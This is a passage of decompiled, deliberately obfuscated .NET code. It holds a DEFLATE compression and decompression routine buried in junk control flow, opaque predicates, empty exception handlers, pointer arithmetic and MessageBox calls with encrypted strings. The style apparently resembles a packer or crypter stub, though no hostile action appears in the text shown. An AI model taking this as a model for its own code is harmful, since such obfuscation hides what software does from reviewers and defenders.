      *(int*) ((IntPtr) voidPtr + 8) = 14 + *(int*) voidPtr * 3 + \u0004.\u0001(_param3.\u0003) + \u0004.\u0001(_param3.\u0001) + \u0004.\u0001(_param3.\u0002) + _param3.\u000F;
      *(int*) ((IntPtr) voidPtr + 12) = _param3.\u000F;
      *(int*) ((IntPtr) voidPtr + 16) = 0;
      while (*(int*) ((IntPtr) voidPtr + 16) < 286)
      {
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (int) _param3.\u0001.\u0001[*(int*) ((IntPtr) voidPtr + 16)] * (int) \u0004.\u0007.\u0003[*(int*) ((IntPtr) voidPtr + 16)];
        *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
      }
      *(int*) ((IntPtr) voidPtr + 20) = 0;
      while (*(int*) ((IntPtr) voidPtr + 20) < 30)
      {
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (int) _param3.\u0002.\u0001[*(int*) ((IntPtr) voidPtr + 20)] * (int) \u0004.\u0007.\u0004[*(int*) ((IntPtr) voidPtr + 20)];
        *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 20) + 1;
      }
      if (*(int*) ((IntPtr) voidPtr + 8) >= *(int*) ((IntPtr) voidPtr + 12))
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 12);
      if (_param2 >= 0 && _param1 + 4 < *(int*) ((IntPtr) voidPtr + 8) >> 3)
        \u0004.\u0001(_param2, _param0, _param3, _param1, obj4);
      else if (*(int*) ((IntPtr) voidPtr + 8) == *(int*) ((IntPtr) voidPtr + 12))
      {
        \u0004.\u0001(_param3.\u0001, 2 + (obj4 ? 1 : 0), 3);
        \u0004.\u0007.\u0001 obj3 = _param3.\u0001;
        \u0004.\u0001(\u0004.\u0007.\u0002, \u0004.\u0007.\u0003, obj3);
        \u0004.\u0007.\u0001 obj5 = _param3.\u0002;
        \u0004.\u0001(\u0004.\u0007.\u0003, \u0004.\u0007.\u0004, obj5);
        \u0004.\u0001(_param3);
        \u0004.\u0001(_param3);
      }
      else
      {
        \u0004.\u0001(_param3.\u0001, 4 + (obj4 ? 1 : 0), 3);
        \u0004.\u0001(_param3, *(int*) voidPtr);
        \u0004.\u0001(_param3);
        \u0004.\u0001(_param3);
      }
    }

    static unsafe bool \u0001([In] \u0004.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      int num1 = \u0004.\u0001(obj0.\u0001);
      while (true)
      {
        int index1;
        while (num1 >= 258)
        {
          *(int*) ((IntPtr) voidPtr + 8) = obj0.\u0013;
          switch (*(int*) ((IntPtr) voidPtr + 8))
          {
            case 7:
              int num2 = \u0004.\u0001(obj0.\u0001, obj0.\u0001);
              if (true)
              {
                index1 = num2;
                int num3;
                for (int index2 = num2 & -256; index2 == 0; index2 = num3)
                {
                  \u0004.\u0001(obj0.\u0001, index1);
                  num3 = num1;
                  if (true)
                  {
                    if ((num1 = num3 - 1) < 258)
                      return true;
                    goto case 7;
                  }
                }
                int num4 = index1;
                num2 = 257;
                num2 = num4;
              }
              if (num2 < num2)
              {
                if (index1 < 0)
                  return false;
                obj0.\u0002 = (\u0004.\u0004) null;
                obj0.\u0001 = (\u0004.\u0004) null;
                obj0.\u0013 = 2;
                return true;
              }
              obj0.\u0015 = \u0004.\u0001.\u0001[index1 - 257];
              obj0.\u0014 = \u0004.\u0001.\u0002[index1 - 257];
              goto case 8;
            case 8:
              if (obj0.\u0014 > 0)
              {
                obj0.\u0013 = 8;
                if (true)
                {
                  *(int*) voidPtr = \u0004.\u0001(obj0.\u0001, obj0.\u0014);
                  if (*(int*) voidPtr < 0)
                    return false;
                  \u0004.\u0001(obj0.\u0001, obj0.\u0014);
                  obj0.\u0015 += *(int*) voidPtr;
                }
                else
                  goto label_21;
              }
              obj0.\u0013 = 9;
              goto case 9;
            case 9:
              index1 = \u0004.\u0001(obj0.\u0002, obj0.\u0001);
              goto label_20;
            case 10:
              goto label_23;
            default:
              continue;
          }
        }
        goto label_29;
label_20:
        if (index1 >= 0)
        {
          obj0.\u0016 = \u0004.\u0001.\u0003[index1];
          obj0.\u0014 = \u0004.\u0001.\u0004[index1];
        }
        else
          break;
label_23:
        if (obj0.\u0014 > 0)
        {
          obj0.\u0013 = 10;
          *(int*) ((IntPtr) voidPtr + 4) = \u0004.\u0001(obj0.\u0001, obj0.\u0014);
          if (*(int*) ((IntPtr) voidPtr + 4) >= 0)
          {
            \u0004.\u0001(obj0.\u0001, obj0.\u0014);
            obj0.\u0016 += *(int*) ((IntPtr) voidPtr + 4);
          }
          else
            goto label_25;
        }
        \u0004.\u0001(obj0.\u0001, obj0.\u0015, obj0.\u0016);
        num1 -= obj0.\u0015;
        obj0.\u0013 = 7;
        continue;
label_29:
        if (false)
          goto label_20;
        else
          goto label_30;
      }
label_21:
      return false;
label_25:
      return false;
label_30:
      return true;
    }

    static void \u0001([In] \u0005.\u0003 obj0)
    {
      do
      {
        if (true)
          goto label_3;
label_2:
        continue;
label_3:
        obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0001, new object[0]);
        goto label_2;
      }
      while (false);
    }

    static unsafe bool \u0001(\u0004.\u0005 _param0, [In] \u0004.\u0002 obj1)
    {
      int num1 = 8;
      void* voidPtr;
      if (num1 != 0)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(num1);
        goto label_43;
      }
label_2:
      int num2;
      int num3;
      int num4;
      int num5;
      switch (num1)
      {
        case 0:
          _param0.\u0008 = \u0004.\u0001(obj1, 5);
          if (_param0.\u0008 < 0)
            return false;
          _param0.\u0008 += 257;
          \u0004.\u0001(obj1, 5);
          _param0.\u0007 = 1;
          goto case 1;
        case 1:
          _param0.\u000E = \u0004.\u0001(obj1, 5);
          if (_param0.\u000E >= 0)
          {
            ++_param0.\u000E;
            \u0004.\u0001(obj1, 5);
            _param0.\u0010 = _param0.\u0008 + _param0.\u000E;
            _param0.\u0002 = new byte[_param0.\u0010];
            _param0.\u0007 = 2;
            goto case 2;
          }
          else
            break;
        case 2:
          _param0.\u000F = \u0004.\u0001(obj1, 4);
          if (_param0.\u000F < 0)
            return false;
          _param0.\u000F += 4;
          \u0004.\u0001(obj1, 4);
          _param0.\u0001 = new byte[19];
          _param0.\u0012 = 0;
          goto label_12;
        case 3:
label_19:
          num4 = _param0.\u0012;
          num5 = _param0.\u000F;
          if (true)
          {
            if (num4 < num5)
            {
              *(int*) voidPtr = \u0004.\u0001(obj1, 3);
              goto label_14;
            }
            else
            {
              _param0.\u0001 = new \u0004.\u0004(_param0.\u0001);
              _param0.\u0001 = (byte[]) null;
              _param0.\u0012 = 0;
              if (true)
              {
                _param0.\u0007 = 4;
                goto case 4;
              }
              else
                break;
            }
          }
          else
            goto label_25;
        case 4:
label_27:
          int num6;
          if (((num6 = \u0004.\u0001(_param0.\u0001, obj1)) & -16) == 0)
          {
            if (true)
            {
              byte[] numArray = _param0.\u0002;
              num2 = _param0.\u0012++;
              int index = num2;
              int num7 = (int) (_param0.\u0001 = (byte) num6);
              numArray[index] = (byte) num7;
              int num8 = _param0.\u0012;
              num5 = _param0.\u0010;
              num4 = num8;
              goto label_25;
            }
            else
              goto label_12;
          }
          else
          {
            if (num6 < 0)
              return false;
            if (num6 >= 17)
              _param0.\u0001 = (byte) 0;
            _param0.\u0011 = num6 - 16;
            if (true)
            {
              _param0.\u0007 = 5;
              goto case 5;
            }
            else
              goto case 5;
          }
        case 5:
          *(int*) ((IntPtr) voidPtr + 4) = \u0004.\u0005.\u0002[_param0.\u0011];
          num3 = \u0004.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4));
          if (num3 < 0)
            return false;
          goto label_36;
        default:
          goto label_43;
      }
      return false;
label_12:
      _param0.\u0007 = 3;
      goto label_19;
label_14:
      int num9 = *(int*) voidPtr;
      if (false)
        return num9 != 0;
      if (num9 < 0)
        return false;
      \u0004.\u0001(obj1, 3);
      if (true)
      {
        _param0.\u0001[\u0004.\u0005.\u0003[_param0.\u0012]] = (byte) *(int*) voidPtr;
        ++_param0.\u0012;
        goto label_19;
      }
      else
        goto label_36;
label_25:
      if (num4 == num5)
        return true;
      goto label_27;
label_36:
      \u0004.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4));
      num3 += \u0004.\u0005.\u0001[_param0.\u0011];
      while (num3-- > 0)
      {
        byte[] numArray = _param0.\u0002;
        num2 = _param0.\u0012++;
        int index = num2;
        int num10 = (int) _param0.\u0001;
        numArray[index] = (byte) num10;
      }
      if (true)
      {
        if (_param0.\u0012 == _param0.\u0010)
          return true;
        _param0.\u0007 = 4;
      }
      else
        goto label_14;
label_43:
      int num11 = _param0.\u0007;
      if (true)
        num2 = num11;
      num1 = num2;
      goto label_2;
    }

    static void \u0001([In] \u0004.\u0006 obj0) => obj0.\u0007 |= 12;

    static void \u0001([In] \u0004.\u0008 obj0)
    {
label_0:
      int num1 = obj0.\u0014;
      int num2 = 65274;
      if (num2 != 0)
      {
        if (num1 >= num2)
        {
          \u0004.\u0001(obj0);
          goto label_11;
        }
        else
          goto label_11;
      }
      else
        goto label_14;
label_10:
      int length;
      obj0.\u0016 += length;
      obj0.\u0015 += length;
label_11:
      if (obj0.\u0015 >= 262)
        goto label_15;
label_12:
      int num3 = obj0.\u0017;
      if (true)
      {
        num2 = obj0.\u0018;
        num1 = num3;
      }
      else
        goto label_19;
label_14:
      if (num1 < num2)
      {
        if (true)
        {
          num3 = 65536 - obj0.\u0015 - obj0.\u0014;
          goto label_19;
        }
        else
          goto label_10;
      }
label_15:
      if (true)
      {
        if (obj0.\u0015 < 3)
          return;
        \u0004.\u0001(obj0);
        return;
      }
      goto label_12;
label_19:
      length = num3;
      if (length > obj0.\u0018 - obj0.\u0017)
      {
        int num4 = obj0.\u0018;
        int num5 = obj0.\u0017;
        if (true)
        {
          length = num4 - num5;
        }
        else
        {
          num2 = num5;
          num1 = num4;
          goto label_14;
        }
      }
      Array.Copy((Array) obj0.\u0002, obj0.\u0017, (Array) obj0.\u0001, obj0.\u0014 + obj0.\u0015, length);
      if (true)
      {
        obj0.\u0017 += length;
        goto label_10;
      }
      else
        goto label_0;
    }

    static unsafe void \u0001([In] \u0002.\u0002 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr1 = (void*) __untypedstackalloc(191);
      *(int*) ((IntPtr) voidPtr1 + 112) = 5610;
      Decimal num1 = 694485307M;
      *(sbyte*) ((IntPtr) voidPtr1 + 180) = (sbyte) 1;
      *(double*) ((IntPtr) voidPtr1 + 24) = 9137.0;
      *(long*) ((IntPtr) voidPtr1 + 8) = 834817L;
      while (true)
      {
        *(sbyte*) ((IntPtr) voidPtr1 + 190) = (sbyte) 1;
        if (*(sbyte*) ((IntPtr) voidPtr1 + 190) != (sbyte) 0)
        {
          *(sbyte*) ((IntPtr) voidPtr1 + 183) = (sbyte) 0;
          *(sbyte*) ((IntPtr) voidPtr1 + 184) = (sbyte) 1;
          *(double*) ((IntPtr) voidPtr1 + 72) = 43.0;
          *(long*) ((IntPtr) voidPtr1 + 64) = 6779L;
          *(double*) ((IntPtr) voidPtr1 + 56) = 502453923.0;
        }
        else
          break;
      }
      *(long*) ((IntPtr) voidPtr1 + 32) = 5137375L;
      *(double*) ((IntPtr) voidPtr1 + 16) = 46298003.0;
      *(long*) ((IntPtr) voidPtr1 + 40) = 0L;
      *(sbyte*) ((IntPtr) voidPtr1 + 182) = (sbyte) 1;
      while (true)
      {
        *(sbyte*) ((IntPtr) voidPtr1 + 190) = (sbyte) 1;
        if (*(sbyte*) ((IntPtr) voidPtr1 + 190) != (sbyte) 0)
        {
          *(sbyte*) ((IntPtr) voidPtr1 + 180) = (sbyte) 0;
          if (true)
          {
            int num2 = (int) MessageBox.Show(\u0004.\u000F(4886));
            num1 = 0M;
            num1 = 24384516M;
            *(long*) ((IntPtr) voidPtr1 + 80) = 97907794L;
          }
          else
            goto label_24;
        }
        else
          break;
      }
      *(int*) ((IntPtr) voidPtr1 + 112) = 6092;
      int num3 = (int) MessageBox.Show(\u0004.\u000F(5172));
      *(int*) ((IntPtr) voidPtr1 + 112) = 0;
      *(int*) ((IntPtr) voidPtr1 + 112) = 36499542;
      *(long*) ((IntPtr) voidPtr1 + 8) = 489895L;
      num1 = 0M;
      num1 = 4744592M;
      *(long*) voidPtr1 = 257267654L;
      *(sbyte*) ((IntPtr) voidPtr1 + 181) = (sbyte) 0;
      *(sbyte*) ((IntPtr) voidPtr1 + 190) = (sbyte) 1;
      if (*(sbyte*) ((IntPtr) voidPtr1 + 190) != (sbyte) 0)
      {
        if (true)
        {
          num1 = 16M;
          *(double*) ((IntPtr) voidPtr1 + 24) = 94.0;
          string str = \u0004.\u000F(5253);
          do
          {
            *(sbyte*) ((IntPtr) voidPtr1 + 190) = (sbyte) 0;
            if (*(sbyte*) ((IntPtr) voidPtr1 + 190) != (sbyte) 0)
            {
              *(sbyte*) ((IntPtr) voidPtr1 + 181) = (sbyte) 1;
              *(sbyte*) ((IntPtr) voidPtr1 + 181) = (sbyte) 1;
              *(int*) ((IntPtr) voidPtr1 + 112) = 390471458;
              *(long*) ((IntPtr) voidPtr1 + 8) = 1074L;
            }
            else
              goto label_11;
          }
          while (true);
          goto label_23;
label_11:
          *(sbyte*) ((IntPtr) voidPtr1 + 190) = (sbyte) 1;
          if (*(sbyte*) ((IntPtr) voidPtr1 + 190) != (sbyte) 0)
            *(int*) ((IntPtr) voidPtr1 + 120) = 7537;
          else
            *(int*) ((IntPtr) voidPtr1 + 124) = 596095;
          *(double*) ((IntPtr) voidPtr1 + 24) = 832730.0;
          num1 = 1875836M;
        }
        else
          goto label_16;
      }
      *(int*) ((IntPtr) voidPtr1 + 112) = 210369;
      *(long*) ((IntPtr) voidPtr1 + 48) = 739533L;
      goto label_20;
label_16:
      *(int*) ((IntPtr) voidPtr1 + 112) = 1;
      string str1 = \u0004.\u000F(5455);
      *(long*) ((IntPtr) voidPtr1 + 88) = 24122L;
      *(int*) ((IntPtr) voidPtr1 + 128) = 54;
      *(sbyte*) ((IntPtr) voidPtr1 + 190) = (sbyte) 1;
      if (*(sbyte*) ((IntPtr) voidPtr1 + 190) != (sbyte) 0)
        *(int*) ((IntPtr) voidPtr1 + 132) = 1;
      else
        *(int*) ((IntPtr) voidPtr1 + 136) = 818936;
      *(long*) ((IntPtr) voidPtr1 + 48) = 19192L;
      *(sbyte*) ((IntPtr) voidPtr1 + 181) = (sbyte) 1;
label_20:
      *(sbyte*) ((IntPtr) voidPtr1 + 190) = (sbyte) 1;
      if (*(sbyte*) ((IntPtr) voidPtr1 + 190) == (sbyte) 0)
      {
        *(int*) ((IntPtr) voidPtr1 + 116) = 1;
        *(int*) ((IntPtr) voidPtr1 + 140) = 4542078;
        goto label_25;
      }
      else
        goto label_16;
label_23:
      int num4 = (int) MessageBox.Show(\u0004.\u000F(5613));
label_24:
      *(int*) ((IntPtr) voidPtr1 + 140) = checked (*(int*) unchecked ((IntPtr) voidPtr1 + 140) + 1);
label_25:
      int num5 = *(int*) ((IntPtr) voidPtr1 + 140);
      *(int*) ((IntPtr) voidPtr1 + 176) = 357023;
      int num6 = *(int*) ((IntPtr) voidPtr1 + 176);
      if (num5 <= num6)
      {
        *(double*) ((IntPtr) voidPtr1 + 24) = 15.0;
        goto label_23;
      }
      else
      {
        try
        {
        }
        catch (Exception ex1)
        {
          ProjectData.SetProjectError(ex1);
          void* voidPtr2;
          *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 0;
          if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
          {
            *(int*) ((IntPtr) voidPtr2 + 112) = 53021252;
            *(long*) ((IntPtr) voidPtr2 + 32) = 896414L;
            num1 = 757729292M;
            *(sbyte*) ((IntPtr) voidPtr2 + 187) = (sbyte) 0;
            int num7 = (int) MessageBox.Show(\u0004.\u000F(5658));
            *(sbyte*) ((IntPtr) voidPtr2 + 186) = (sbyte) 1;
            *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 0;
            if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
              *(sbyte*) ((IntPtr) voidPtr2 + 188) = (sbyte) 1;
            try
            {
            }
            catch (Exception ex2)
            {
              ProjectData.SetProjectError(ex2);
              *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 0;
              if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
                *(int*) ((IntPtr) voidPtr2 + 148) = 9543;
              else
                *(int*) ((IntPtr) voidPtr2 + 152) = 58979255;
              *(double*) ((IntPtr) voidPtr2 + 16) = 169873.0;
              *(sbyte*) ((IntPtr) voidPtr2 + 189) = (sbyte) 0;
              *(long*) ((IntPtr) voidPtr2 + 104) = 927617L;
              try
              {
              }
              catch (Exception ex3)
              {
                ProjectData.SetProjectError(ex3);
                ProjectData.ClearProjectError();
              }
              *(double*) ((IntPtr) voidPtr2 + 24) = 444.0;
              *(int*) ((IntPtr) voidPtr2 + 112) = 27295;
              *(long*) ((IntPtr) voidPtr2 + 32) = 872546852L;
              *(double*) ((IntPtr) voidPtr2 + 24) = 75.0;
              ProjectData.ClearProjectError();
            }
            *(int*) ((IntPtr) voidPtr2 + 156) = 273;
            int num8;
            int num9;
            do
            {
              *(int*) ((IntPtr) voidPtr2 + 156) = checked (*(int*) unchecked ((IntPtr) voidPtr2 + 156) + 1);
              num8 = *(int*) ((IntPtr) voidPtr2 + 156);
              *(int*) ((IntPtr) voidPtr2 + 176) = 6736467;
              num9 = *(int*) ((IntPtr) voidPtr2 + 176);
            }
            while (num8 <= num9);
            *(long*) ((IntPtr) voidPtr2 + 48) = 25662893L;
            *(sbyte*) ((IntPtr) voidPtr2 + 185) = (sbyte) 0;
          }
          *(double*) ((IntPtr) voidPtr2 + 96) = 30950606.0;
          *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 0;
          if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
            *(int*) ((IntPtr) voidPtr2 + 160) = 3;
          else
            *(int*) ((IntPtr) voidPtr2 + 164) = 2;
          while (true)
          {
            *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 1;
            if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
              num1 = 449339M;
            else
              break;
          }
          *(long*) ((IntPtr) voidPtr2 + 32) = 4824L;
          *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 0;
          if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
            *(int*) ((IntPtr) voidPtr2 + 168) = 59;
          else
            *(int*) ((IntPtr) voidPtr2 + 172) = 7549083;
          *(double*) ((IntPtr) voidPtr2 + 16) = 928.0;
          *(int*) ((IntPtr) voidPtr2 + 144) = 33101690;
          ProjectData.ClearProjectError();
        }
      }
    }

    static void \u0001(\u0004.\u0003 _param0, int _param1, int _param2, [In] int obj3)
    {
      if (false)
        return;
      while (true)
      {
        int num1 = _param2;
        int num2;
        while (true)
        {
          num2 = num1 - 1;
          if (false)
            num1 = num2;
          else
            break;
        }
        _param2 = num2;
        if (num1 > 0)
        {
          byte[] numArray = _param0.\u0001;
          \u0004.\u0003 obj = _param0;
          int num3;
          int num4 = num3 = obj.\u0003;
          obj.\u0003 = num3 + 1;
          int index = num4;
          int num5 = (int) _param0.\u0001[_param1++];
          numArray[index] = (byte) num5;
          _param0.\u0003 &= (int) short.MaxValue;
          int num6 = _param1;
          if (true)
            num6 &= (int) short.MaxValue;
          _param1 = num6;
        }
        else
          break;
      }
    }

    static int \u0001(\u0004.\u0002 _param0, [In] int obj1)
    {
      while (_param0.\u0003 < obj1)
      {
        if (_param0.\u0001 == _param0.\u0002)
        {
          if (true)
          {
            if (true)
              return -1;
          }
          else
            break;
        }
        else if (true)
        {
          \u0004.\u0002 obj2 = _param0;
          int num1 = (int) obj2.\u0001;
          byte[] numArray1 = _param0.\u0001;
          \u0004.\u0002 obj3 = _param0;
          int num2;
          int num3 = num2 = obj3.\u0001;
          obj3.\u0001 = num2 + 1;
          int index1 = num3;
          int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
          byte[] numArray2 = _param0.\u0001;
          \u0004.\u0002 obj4 = _param0;
          int num5;
          int num6 = num5 = obj4.\u0001;
          obj4.\u0001 = num5 + 1;
          int index2 = num6;
          int num7 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
          int num8 = (num4 | num7) << _param0.\u0003;
          obj2.\u0001 = (uint) (num1 | num8);
        }
        else
          continue;
        _param0.\u0003 += 16;
        break;
      }
      long num9 = (long) _param0.\u0001;
      int num10 = 1;
      int num11 = obj1;
      int num12;
      do
      {
        if (true)
        {
          int num13 = num11 & 31;
          num12 = num10 << num13;
          if (true)
          {
            num11 = 1;
            num10 = num12;
          }
          else
            goto label_15;
        }
      }
      while (num11 == 0);
      int num14 = num10 - num11;
      goto label_13;
label_15:
      num14 = num12;
label_13:
      long num15 = (long) num14;
      return (int) (num9 & num15);
    }

    static void \u0001(\u0004.\u0007 _param0, [In] int obj1)
    {
      if (true)
        goto label_10;
label_6:
      int index;
      ++index;
label_7:
      if (index < obj1)
      {
        if (false)
          return;
        \u0004.\u0001(_param0.\u0001, (int) _param0.\u0003.\u0001[\u0004.\u0007.\u0001[index]], 3);
        goto label_6;
      }
      else
      {
        do
        {
          \u0004.\u0007.\u0001 obj = _param0.\u0001;
          \u0004.\u0001(_param0.\u0003, obj);
        }
        while (false);
        \u0004.\u0007.\u0001 obj2 = _param0.\u0002;
        \u0004.\u0001(_param0.\u0003, obj2);
        return;
      }
label_10:
      \u0004.\u0001(_param0.\u0003);
      \u0004.\u0001(_param0.\u0001);
      \u0004.\u0001(_param0.\u0002);
      if (true)
      {
        \u0004.\u000E obj = _param0.\u0001;
        int num = _param0.\u0001.\u0002 - 257;
        if (true)
          goto label_12;
label_1:
        \u0004.\u0001(_param0.\u0001, _param0.\u0002.\u0002 - 1, 5);
        do
        {
          \u0004.\u0001(_param0.\u0001, obj1 - 4, 4);
          index = 0;
        }
        while (false);
        goto label_7;
label_12:
        \u0004.\u0001(obj, num, 5);
        goto label_1;
      }
      else
        goto label_7;
    }

    static void \u0001(\u0004.\u000E _param0, int _param1, [In] int obj2)
    {
      do
      {
        _param0.\u0001 |= (uint) (_param1 << _param0.\u0003);
        _param0.\u0003 += obj2;
        if (_param0.\u0003 >= 16)
          goto label_5;
label_4:
        continue;
label_5:
        byte[] numArray = _param0.\u0001;
        \u0004.\u000E obj = _param0;
        int num1;
        int num2 = num1 = obj.\u0002;
        obj.\u0002 = num1 + 1;
        int index = num2;
        int num3 = (int) (byte) _param0.\u0001;
        numArray[index] = (byte) num3;
label_1:
        if (true)
        {
          _param0.\u0001[_param0.\u0002++] = (byte) (_param0.\u0001 >> 8);
          _param0.\u0001 >>= 16;
          if (true)
          {
            _param0.\u0003 -= 16;
            goto label_4;
          }
          else
            goto label_1;
        }
      }
      while (false);
    }

    static unsafe int \u0001([In] \u0004.\u0007.\u0001 obj0)
    {
      int num1 = 8;
      if (num1 == 0)
        return num1;
      // ISSUE: untyped stack allocation
      IntPtr num2 = __untypedstackalloc(num1);
      void* voidPtr;
      if (true)
        voidPtr = (void*) num2;
      do
      {
        *(int*) voidPtr = 0;
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        while (*(int*) ((IntPtr) voidPtr + 4) < obj0.\u0001.Length)
        {
          *(int*) voidPtr = *(int*) voidPtr + (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)] * (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
        }
      }
      while (false);
      return *(int*) voidPtr;
    }

    static bool \u0001([In] \u0004.\u0008 obj0) => obj0.\u0018 == obj0.\u0017;

    static int \u0001([In] \u0004.\u000F obj0) => obj0.ReadByte() | obj0.ReadByte() << 8;

    static unsafe void \u0001([In] \u0007.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr1 = (void*) __untypedstackalloc(167);
      string str1 = \u0004.\u000F(5896);
      *(sbyte*) ((IntPtr) voidPtr1 + 165) = (sbyte) 0;
      if (*(sbyte*) ((IntPtr) voidPtr1 + 165) != (sbyte) 0)
        goto label_43;
label_3:
      while (true)
      {
        *(sbyte*) ((IntPtr) voidPtr1 + 166) = (sbyte) 0;
        if (*(sbyte*) ((IntPtr) voidPtr1 + 166) != (sbyte) 0)
          *(sbyte*) ((IntPtr) voidPtr1 + 164) = (sbyte) 0;
        else
          break;
      }
      *(double*) ((IntPtr) voidPtr1 + 16) = 0.1906334;
      void* voidPtr2;
      double num1;
      double num2;
      do
      {
        string str2 = \u0004.\u000F(6054);
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          *(long*) ((IntPtr) voidPtr2 + 24) = 1L;
          ProjectData.ClearProjectError();
        }
        *(sbyte*) ((IntPtr) voidPtr1 + 166) = (sbyte) 0;
        if (*(sbyte*) ((IntPtr) voidPtr1 + 166) != (sbyte) 0)
        {
          *(long*) ((IntPtr) voidPtr1 + 32) = 0L;
          try
          {
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            *(double*) ((IntPtr) voidPtr2 + 40) = 1150451870.0;
            ProjectData.ClearProjectError();
          }
        }
        while (true)
        {
          *(sbyte*) ((IntPtr) voidPtr1 + 166) = (sbyte) 0;
          if (*(sbyte*) ((IntPtr) voidPtr1 + 166) != (sbyte) 0)
            *(double*) ((IntPtr) voidPtr1 + 48) = -399199559.0;
          else
            break;
        }
        *(double*) ((IntPtr) voidPtr1 + 16) = *(double*) ((IntPtr) voidPtr1 + 16) + 1.0;
        num1 = *(double*) ((IntPtr) voidPtr1 + 16);
        *(double*) ((IntPtr) voidPtr1 + 144) = 0.6840623;
        num2 = *(double*) ((IntPtr) voidPtr1 + 144);
      }
      while (num1 <= num2);
      *(double*) voidPtr1 = -314001396.0;
      *(sbyte*) ((IntPtr) voidPtr1 + 166) = (sbyte) 1;
      if (*(sbyte*) ((IntPtr) voidPtr1 + 166) != (sbyte) 0)
      {
        *(sbyte*) ((IntPtr) voidPtr1 + 165) = (sbyte) 0;
        if (*(sbyte*) ((IntPtr) voidPtr1 + 165) != (sbyte) 0)
          *(double*) ((IntPtr) voidPtr1 + 56) = 0.3796047;
        *(int*) ((IntPtr) voidPtr1 + 152) = 767329386;
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          *(sbyte*) ((IntPtr) voidPtr2 + 166) = (sbyte) 0;
          if (*(sbyte*) ((IntPtr) voidPtr2 + 166) != (sbyte) 0)
            *(double*) ((IntPtr) voidPtr2 + 80) = 0.1154701;
          if (true)
          {
            *(int*) ((IntPtr) voidPtr2 + 156) = -1886773129;
            *(sbyte*) ((IntPtr) voidPtr2 + 166) = (sbyte) 0;
            if (*(sbyte*) ((IntPtr) voidPtr2 + 166) != (sbyte) 0)
              *(double*) ((IntPtr) voidPtr2 + 88) = 0.7148163;
            *(long*) ((IntPtr) voidPtr2 + 64) = 1L;
            *(sbyte*) ((IntPtr) voidPtr2 + 166) = (sbyte) 0;
            if (*(sbyte*) ((IntPtr) voidPtr2 + 166) != (sbyte) 0)
              *(double*) ((IntPtr) voidPtr2 + 96) = 0.4680057;
            *(int*) ((IntPtr) voidPtr2 + 160) = 1393390040;
          }
          *(sbyte*) ((IntPtr) voidPtr2 + 166) = (sbyte) 1;
          if (*(sbyte*) ((IntPtr) voidPtr2 + 166) != (sbyte) 0)
            *(double*) ((IntPtr) voidPtr2 + 104) = 0.3989323;
          *(double*) ((IntPtr) voidPtr2 + 72) = -1016843343.0;
          ProjectData.ClearProjectError();
        }
      }
      while (true)
      {
        *(sbyte*) ((IntPtr) voidPtr1 + 166) = (sbyte) 0;
        if (*(sbyte*) ((IntPtr) voidPtr1 + 166) != (sbyte) 0)
        {
          *(double*) ((IntPtr) voidPtr1 + 112) = 2039359070.0;
          try
          {
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            *(double*) ((IntPtr) voidPtr2 + 120) = 1606491261.0;
            ProjectData.ClearProjectError();
          }
        }
        else
          break;
      }
      *(double*) ((IntPtr) voidPtr1 + 128) = 0.08855951;
      double num3;
      double num4;
      do
      {
        *(sbyte*) ((IntPtr) voidPtr1 + 166) = (sbyte) 0;
        if (*(sbyte*) ((IntPtr) voidPtr1 + 166) != (sbyte) 0)
          *(double*) ((IntPtr) voidPtr1 + 136) = 0.4311444;
        *(double*) ((IntPtr) voidPtr1 + 128) = *(double*) ((IntPtr) voidPtr1 + 128) + 1.0;
        num3 = *(double*) ((IntPtr) voidPtr1 + 128);
        *(double*) ((IntPtr) voidPtr1 + 144) = 0.6345711;
        num4 = *(double*) ((IntPtr) voidPtr1 + 144);
      }
      while (num3 <= num4);
      return;
label_43:
      *(sbyte*) ((IntPtr) voidPtr1 + 166) = (sbyte) 0;
      if (*(sbyte*) ((IntPtr) voidPtr1 + 166) != (sbyte) 0)
        goto label_44;
label_1:
      goto label_3;
label_44:
      *(double*) ((IntPtr) voidPtr1 + 8) = 0.3634587;
      goto label_1;
    }

    static int \u0001([In] \u0004.\u0003 obj0) => 32768 - obj0.\u0004;

    static unsafe void \u0001(\u0004.\u0007.\u0001 _param0, [In] \u0004.\u0007.\u0001 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
